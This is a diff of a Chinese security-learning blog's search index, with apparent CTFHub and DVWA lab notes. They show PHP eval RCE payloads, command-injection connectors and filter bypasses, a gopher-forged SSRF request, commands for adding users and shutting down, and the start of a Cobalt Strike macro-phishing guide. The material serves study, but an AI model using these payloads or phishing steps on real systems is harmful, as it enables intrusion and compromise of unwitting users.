-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175838535.png" alt="image-20230818175838535"></p>
+<h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1. 反射型"></a>1. 反射型</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/Users\AJNUY\AppData\Roaming\Typora\typora-user-images\image-20230818175801011.png" alt="image-20230818175801011"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175838535.png" alt="image-20230818175838535"></p>
 <p>获取XSS反射代码</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175917767.png" alt="image-20230818175917767"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175917767.png" alt="image-20230818175917767"></p>
 <p>访问到xss代码</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818180011029.png" alt="image-20230818180011029"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818180011029.png" alt="image-20230818180011029"></p>
 <p>获取到flag</p>
-<h1 id="5-RCE"><a href="#5-RCE" class="headerlink" title="5. RCE"></a>5. RCE</h1><h3 id="1-eval执行"><a href="#1-eval执行" class="headerlink" title="1. eval执行"></a>1. eval执行</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161224097.png" alt="image-20230905161224097"></p>
+<h1 id="5-RCE"><a href="#5-RCE" class="headerlink" title="5. RCE"></a>5. RCE</h1><h3 id="1-eval执行"><a href="#1-eval执行" class="headerlink" title="1. eval执行"></a>1. eval执行</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161224097.png" alt="image-20230905161224097"></p>
 <p>题目给出了php的代码，PHP代码显示，要求<strong>将命令赋值给cmd然后执行</strong></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161446056.png" alt="image-20230905161446056"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161446056.png" alt="image-20230905161446056"></p>
 <p><strong>cmd命令的格式一点不能错，后面的分号不能省略</strong></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162137980.png" alt="image-20230905162137980"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162137980.png" alt="image-20230905162137980"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//查看上一级的目录</span><br><span class="line">cmd=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure>
 
 <p>发现flag文件</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162352302.png" alt="image-20230905162352302"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162352302.png" alt="image-20230905162352302"></p>
 <p>使用cat命令</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=system(&quot;cat /flag_21985&quot;);</span><br></pre></td></tr></table></figure>
 
 <p>查看到flag的具体内容</p>
-<h3 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2. 文件包含"></a>2. 文件包含</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164534416.png" alt="image-20230905164534416"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164602319.png" alt="image-20230905164602319"></p>
+<h3 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2. 文件包含"></a>2. 文件包含</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164534416.png" alt="image-20230905164534416"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164602319.png" alt="image-20230905164602319"></p>
 <p>拿到题目，可以发现，我们在执行的时候可以将某个文件包含运行，这里明显要求将shell.txt的文件包含一起执行</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164723651.png" alt="image-20230905164723651"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164723651.png" alt="image-20230905164723651"></p>
 <p>成功执行代码</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164802046.png" alt="image-20230905164802046"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164802046.png" alt="image-20230905164802046"></p>
 <p>使用蚁剑连接，当然，使用system命令查看一个也是可以的，然后可以拿到flag</p>
-<h3 id="3-php-x2F-x2F-input"><a href="#3-php-x2F-x2F-input" class="headerlink" title="3. php:&#x2F;&#x2F;input"></a>3. php:&#x2F;&#x2F;input</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912103927339.png" alt="image-20230912103927339"></p>
+<h3 id="3-php-x2F-x2F-input"><a href="#3-php-x2F-x2F-input" class="headerlink" title="3. php:&#x2F;&#x2F;input"></a>3. php:&#x2F;&#x2F;input</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912103927339.png" alt="image-20230912103927339"></p>
 <p>查看题目，可以发现题目没有给我们任何的有eval执行的shell文件了，但是，其留下了一个php:&#x2F;&#x2F;命令，可以使用php:&#x2F;&#x2F;input命令将我们想执行的代码传上去。</p>
 <p>php:&#x2F;&#x2F;input命令是一个php的命令输入流，其会将我们的代码以post的形式传到服务器，换句话说，php:&#x2F;&#x2F;input能接收我们写在post中的代码，并传输到服务器端。</p>
-<h3 id="4-源代码读取"><a href="#4-源代码读取" class="headerlink" title="4. 源代码读取"></a>4. 源代码读取</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912111214367.png" alt="image-20230912111214367"></p>
+<h3 id="4-源代码读取"><a href="#4-源代码读取" class="headerlink" title="4. 源代码读取"></a>4. 源代码读取</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912111214367.png" alt="image-20230912111214367"></p>
 <p>fla在flag中，直接进行访问，使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[文件名]即可。</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112103953.png" alt="image-20230912112103953"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112120798-16955380701701.png" alt="image-20230912112120798"></p>
-<h3 id="5-远程包含"><a href="#5-远程包含" class="headerlink" title="5. 远程包含"></a>5. 远程包含</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112714652.png" alt="image-20230912112714652"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112742766.png" alt="image-20230912112742766"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112103953.png" alt="image-20230912112103953"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112120798-16955380701701.png" alt="image-20230912112120798"></p>
+<h3 id="5-远程包含"><a href="#5-远程包含" class="headerlink" title="5. 远程包含"></a>5. 远程包含</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112714652.png" alt="image-20230912112714652"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112742766.png" alt="image-20230912112742766"></p>
 <p>发现包含include，查看phpinfo，发现开启了allow_url_fopen和allow_url_include，也就是开启了远程包含</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912114803016.png" alt="image-20230912114803016"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912114803016.png" alt="image-20230912114803016"></p>
 <p>使用php:&#x2F;&#x2F;input将命令上传执行。</p>
 <h3 id="6-命令注入-无过滤"><a href="#6-命令注入-无过滤" class="headerlink" title="6. 命令注入-无过滤"></a>6. 命令注入-无过滤</h3><p>两个命令的分隔：</p>
 <p>1、每个命令之间用(分号)”;”隔开；<br>说明:各命令的执行结果，不会影响其他命令的。<br>意思是说每个命令都会执行，但不保证每个命令都执行成功。<br>2、每个命令之间用&amp;&amp;隔开<br>说明：若前面的命令执行成功，才会去执行后面的命令。这样的话，可以保证所有的命令执行完毕后，执行的过程都是成功的。<br>3、每个命令之间用||隔开<br>说明：||是或的意思，只有前面的命令执行失败后采取执行下一条命令，直到执行成功一条命令为止。<br>4、|是管道符号。管道符号改变标准输入的源或者是标准输出的目的地。<br>5、&amp;是后台任务符号。后台任务符号使shell在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作。</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094235230.png" alt="image-20230913094235230"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094431205.png" alt="image-20230913094431205"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104311058.png" alt="image-20230913104311058"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104359762.png" alt="image-20230913104359762"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094235230.png" alt="image-20230913094235230"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094431205.png" alt="image-20230913094431205"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104311058.png" alt="image-20230913104311058"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104359762.png" alt="image-20230913104359762"></p>
 <p>直接使用Linux的命令进行查看</p>
-<h3 id="7-命令注入-cat过滤"><a href="#7-命令注入-cat过滤" class="headerlink" title="7. 命令注入-cat过滤"></a>7. 命令注入-cat过滤</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141710717.png" alt="image-20230913141710717"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141928238.png" alt="image-20230913141928238"></p>
+<h3 id="7-命令注入-cat过滤"><a href="#7-命令注入-cat过滤" class="headerlink" title="7. 命令注入-cat过滤"></a>7. 命令注入-cat过滤</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141710717.png" alt="image-20230913141710717"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141928238.png" alt="image-20230913141928238"></p>
 <p>将cat命令过滤了，可以使用其他的查看命令</p>
 <p>当cat被过滤后,可以使用一下命令进行读取文件的内容<br>(1)more:一页一页的显示的显示档案内容<br>(2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示,可以看出tac是cat的反向显示<br>(5)tail:查看尾几行<br>(6)nl:显示的时候,顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器,这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体的内容</p>
-<h3 id="8-命令注入-过滤空格"><a href="#8-命令注入-过滤空格" class="headerlink" title="8. 命令注入-过滤空格"></a>8. 命令注入-过滤空格</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142247986.png" alt="image-20230913142247986"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142601768.png" alt="image-20230913142601768"></p>
-<h3 id="9-命令注入-过滤目录分隔符"><a href="#9-命令注入-过滤目录分隔符" class="headerlink" title="9. 命令注入-过滤目录分隔符"></a>9. 命令注入-过滤目录分隔符</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913143918669.png" alt="image-20230913143918669"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144015186.png" alt="image-20230913144015186"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144137007.png" alt="image-20230913144137007"></p>
-<h3 id="10-命令注入-过滤运算符"><a href="#10-命令注入-过滤运算符" class="headerlink" title="10. 命令注入-过滤运算符"></a>10. 命令注入-过滤运算符</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145850858.png" alt="image-20230913145850858"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145952945.png" alt="image-20230913145952945"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151042475.png" alt="image-20230913151042475"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151535192.png" alt="image-20230913151535192"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151718585.png" alt="image-20230913151718585"></p>
-<h1 id="6-SSRF"><a href="#6-SSRF" class="headerlink" title="6. SSRF"></a>6. SSRF</h1><h3 id="1-内网访问"><a href="#1-内网访问" class="headerlink" title="1. 内网访问"></a>1. 内网访问</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913201824609.png" alt="image-20230913201824609"></p>
-<h3 id="2-伪协议读取文件"><a href="#2-伪协议读取文件" class="headerlink" title="2. 伪协议读取文件"></a>2. 伪协议读取文件</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913204053560.png" alt="image-20230913204053560"></p>
-<h3 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3. 端口扫描"></a>3. 端口扫描</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205211049.png" alt="image-20230913205211049"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205255854.png" alt="image-20230913205255854"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205530535-16955381276002.png" alt="image-20230913205530535"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205740556.png" alt="image-20230913205740556"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205803285.png" alt="image-20230913205803285"></p>
+<h3 id="8-命令注入-过滤空格"><a href="#8-命令注入-过滤空格" class="headerlink" title="8. 命令注入-过滤空格"></a>8. 命令注入-过滤空格</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142247986.png" alt="image-20230913142247986"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142601768.png" alt="image-20230913142601768"></p>
+<h3 id="9-命令注入-过滤目录分隔符"><a href="#9-命令注入-过滤目录分隔符" class="headerlink" title="9. 命令注入-过滤目录分隔符"></a>9. 命令注入-过滤目录分隔符</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913143918669.png" alt="image-20230913143918669"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144015186.png" alt="image-20230913144015186"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144137007.png" alt="image-20230913144137007"></p>
+<h3 id="10-命令注入-过滤运算符"><a href="#10-命令注入-过滤运算符" class="headerlink" title="10. 命令注入-过滤运算符"></a>10. 命令注入-过滤运算符</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145850858.png" alt="image-20230913145850858"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145952945.png" alt="image-20230913145952945"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151042475.png" alt="image-20230913151042475"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151535192.png" alt="image-20230913151535192"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151718585.png" alt="image-20230913151718585"></p>
+<h1 id="6-SSRF"><a href="#6-SSRF" class="headerlink" title="6. SSRF"></a>6. SSRF</h1><h3 id="1-内网访问"><a href="#1-内网访问" class="headerlink" title="1. 内网访问"></a>1. 内网访问</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913201824609.png" alt="image-20230913201824609"></p>
+<h3 id="2-伪协议读取文件"><a href="#2-伪协议读取文件" class="headerlink" title="2. 伪协议读取文件"></a>2. 伪协议读取文件</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913204053560.png" alt="image-20230913204053560"></p>
+<h3 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3. 端口扫描"></a>3. 端口扫描</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205211049.png" alt="image-20230913205211049"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205255854.png" alt="image-20230913205255854"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205530535-16955381276002.png" alt="image-20230913205530535"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205740556.png" alt="image-20230913205740556"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205803285.png" alt="image-20230913205803285"></p>
 <h3 id="4-POST请求"><a href="#4-POST请求" class="headerlink" title="4. POST请求"></a>4. POST请求</h3><p>写在题目前：</p>
 <p>302跳转的302是http状态码</p>
 <p>表示请求的网页自请求的网页移动到了新的位置，搜索引擎索引中保存原来的URL</p>
@@ -698,22 +737,28 @@
 <p>这里直接写伪造的gopher协议</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">key<span class="operator">=</span>d<span class="number">93819</span><span class="keyword">c</span><span class="number">4</span><span class="keyword">c</span><span class="number">1</span>a<span class="number">18</span>dc<span class="number">606</span>dc<span class="number">5</span><span class="keyword">c</span><span class="number">6486</span>f<span class="number">77227</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917104920370.png" alt="image-20230917104920370"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105031724.png" alt="image-20230917105031724"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917104920370.png" alt="image-20230917104920370"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105031724.png" alt="image-20230917105031724"></p>
 <p>访问flag.php，会发现其给了一个上传框，并且给了一个key。</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105323709.png" alt="image-20230917105323709"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105323709.png" alt="image-20230917105323709"></p>
 <p>使用上传框传数据，但是却提示只能从本地访问。那我们可以使用gopher协议冒充本地访问</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105537086.png" alt="image-20230917105537086"></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105714104.png" alt="image-20230917105714104"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105537086.png" alt="image-20230917105537086"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105714104.png" alt="image-20230917105714104"></p>
 <p>使用gopher构造，具体结构如图，注意，Content-Length的长度应当与key的长度相同，否则不能访问。</p>
-<h3 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5. 文件上传"></a>5. 文件上传</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134059991.png" alt="image-20230918134059991"><br><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134028668.png" alt="image-20230918134028668"></p>
+<h3 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5. 文件上传"></a>5. 文件上传</h3><p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134059991.png" alt="image-20230918134059991"><br><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134028668.png" alt="image-20230918134028668"></p>
 ]]></content>
+      <categories>
+        <category>ctfhhub刷题</category>
+      </categories>
+      <tags>
+        <tag>ctfhub</tag>
+        <tag>ctf</tag>
+      </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>木马钓鱼</title>
     <url>/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/</url>
-    <content><![CDATA[<p>title: 木马钓鱼<br>date: ‎2023-7‎-‎14‎ 19:32:23<br>tags: [Cobalt Strike, 木马钓鱼]<br>categories: [木马钓鱼]</p>
-<h3 id="1-Cobalt-Strike的安装和使用"><a href="#1-Cobalt-Strike的安装和使用" class="headerlink" title="1. Cobalt Strike的安装和使用"></a>1. Cobalt Strike的安装和使用</h3><p>Cobalt Strike是一款美国Red Team开发的<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>神器，常被业界人称为CS。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，<a href="https://so.csdn.net/so/search?q=socket&spm=1001.2101.3001.7020">socket</a>代理，office攻击，文件捆绑，钓鱼等功能。服务端是一个，客户端可以有多个，团队可进行分布式协团操作。，使用之前要自己先配置好java的环境。</p>
+    <content><![CDATA[<h3 id="1-Cobalt-Strike的安装和使用"><a href="#1-Cobalt-Strike的安装和使用" class="headerlink" title="1. Cobalt Strike的安装和使用"></a>1. Cobalt Strike的安装和使用</h3><p>Cobalt Strike是一款美国Red Team开发的<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>神器，常被业界人称为CS。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，<a href="https://so.csdn.net/so/search?q=socket&spm=1001.2101.3001.7020">socket</a>代理，office攻击，文件捆绑，钓鱼等功能。服务端是一个，客户端可以有多个，团队可进行分布式协团操作。，使用之前要自己先配置好java的环境。</p>
 <span id="more"></span>
 
 <h4 id="1-项目框架"><a href="#1-项目框架" class="headerlink" title="1. 项目框架"></a>1. 项目框架</h4><p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712210115247.png" alt="image-20230712210115247"></p>
@@ -784,6 +829,111 @@
 <p>选否，另存为docm文件</p>
 <p>诱导靶机点击文件并打开宏</p>
 ]]></content>
+      <categories>
+        <category>木马钓鱼</category>
+      </categories>
+      <tags>
+        <tag>Cobalt Strike</tag>
+        <tag>木马钓鱼</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DVWA命令执行</title>
+    <url>/2023/10/13/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h3 id="1-常见的网站漏洞"><a href="#1-常见的网站漏洞" class="headerlink" title="1. 常见的网站漏洞"></a>1. 常见的网站漏洞</h3><p>OWASP TOP 10：每年公布关于web安全的十大安全威胁报告，三年公开一次</p>
+<ul>
+<li>SQL注入（key）：渗透数据库，获取数据库数据或者控制权限</li>
+<li>XSS</li>
+<li>文件上传（key）：上传木马病毒到网站中</li>
+<li>反序列化</li>
+<li>文件包含</li>
+<li>CSRF</li>
+<li>命令执行（key）：获取命令执行的权限</li>
+<li>信息泄露</li>
+<li>XXE</li>
+<li>SSRF</li>
+<li>未授权访问</li>
+</ul>
+<span id="more"></span>
+
+
+
+<h3 id="2-DVWA靶场"><a href="#2-DVWA靶场" class="headerlink" title="2. DVWA靶场"></a>2. DVWA靶场</h3><p>OWASP的官方网站</p>
+<h4 id="1-DVMA搭建"><a href="#1-DVMA搭建" class="headerlink" title="1. DVMA搭建"></a>1. DVMA搭建</h4><ul>
+<li>PHP环境：WASP(Windows, Apache, Mysql, Php)</li>
+<li>DVWA源码:<a href="https://codeload.github.com/digininja/DVWA/zip/refs/heads/master">https://codeload.github.com/digininja/DVWA/zip/refs/heads/master</a></li>
+</ul>
+<h5 id="1-六步快速搭建（使用phpstudy-2018）"><a href="#1-六步快速搭建（使用phpstudy-2018）" class="headerlink" title="1. 六步快速搭建（使用phpstudy 2018）"></a>1. 六步快速搭建（使用phpstudy 2018）</h5><ul>
+<li><p>下载安装PHPstudy</p>
+</li>
+<li><p>将解压后的DVWA源码放在phpstudy安装目录的PHPTutorial\WWW目录下</p>
+</li>
+<li><p>进入DVMA&#x2F;config目录，将config.inc.php.dist最后的.dist后缀删除</p>
+</li>
+<li><p>打开刚刚修改的config.inc.php，修改db_user和db_password全为root</p>
+</li>
+<li><p>访问localhost&#x2F;DVMA，点击setup，然后点击最下面的Create DataBase</p>
+</li>
+<li><p>访问localhost&#x2F;DVMA，输入账号密码，admin 和 password，登录</p>
+</li>
+</ul>
+<h5 id="2-使用小皮面板"><a href="#2-使用小皮面板" class="headerlink" title="2. 使用小皮面板"></a>2. 使用小皮面板</h5><ul>
+<li>下载安装小皮面板</li>
+<li>将下载解压后的DVWA源码放在www目录下</li>
+<li>进入DVMA&#x2F;config目录，将config.inc.php.dist最后的.dist后缀删除</li>
+<li>打开刚刚修改的config.inc.php，修改db_user和db_password全为root（小皮面板使用的是内置的另一个MySql，如果之前电脑中已经安装MySql，记得改DVWA下config.inc.php中默认的MySql端口号，小皮面板中的配置也记得改）</li>
+<li>访问localhost&#x2F;DVMA，点击setup，然后点击最下面的Create DataBase</li>
+<li>访问localhost&#x2F;DVMA，输入账号密码，admin 和 password，登录</li>
+</ul>
+<h3 id="3-DVWA命令执行漏洞"><a href="#3-DVWA命令执行漏洞" class="headerlink" title="3. DVWA命令执行漏洞"></a>3. DVWA命令执行漏洞</h3><p>攻击者在执行远程的控制命令时，由于系统设置的不完善，导致攻击者可以执行一些特殊的命令，从而取得权限</p>
+<h4 id="1-常用连接符"><a href="#1-常用连接符" class="headerlink" title="1. 常用连接符"></a>1. 常用连接符</h4><ul>
+<li><p>cmd1|cmd2，无论是cmd1是否执行成功，均执行cmd2</p>
+</li>
+<li><p>cmd1;cmd2，无论是cmd1是否执行成功，均执行cmd2</p>
+</li>
+<li><p>cmd1&amp;cmd2，无论是cmd1是否执行成功，均执行cmd2</p>
+</li>
+<li><p>cmd1||cmd2，只有cmd1失败时才执行cmd2</p>
+</li>
+<li><p>cmd1&amp;&amp;cmd2，只有cmd1成功时才执行cmd2</p>
+</li>
+</ul>
+<h4 id="2-常见cmd命令"><a href="#2-常见cmd命令" class="headerlink" title="2. 常见cmd命令"></a>2. 常见cmd命令</h4><ul>
+<li>whoami：当前用户名</li>
+<li>shutdown -s -t 0：立即关机</li>
+<li>net user [username] [password] &#x2F;add 添加用户，用户名为username，密码为password</li>
+<li>type [file_name] 查看file_name文件的内容</li>
+</ul>
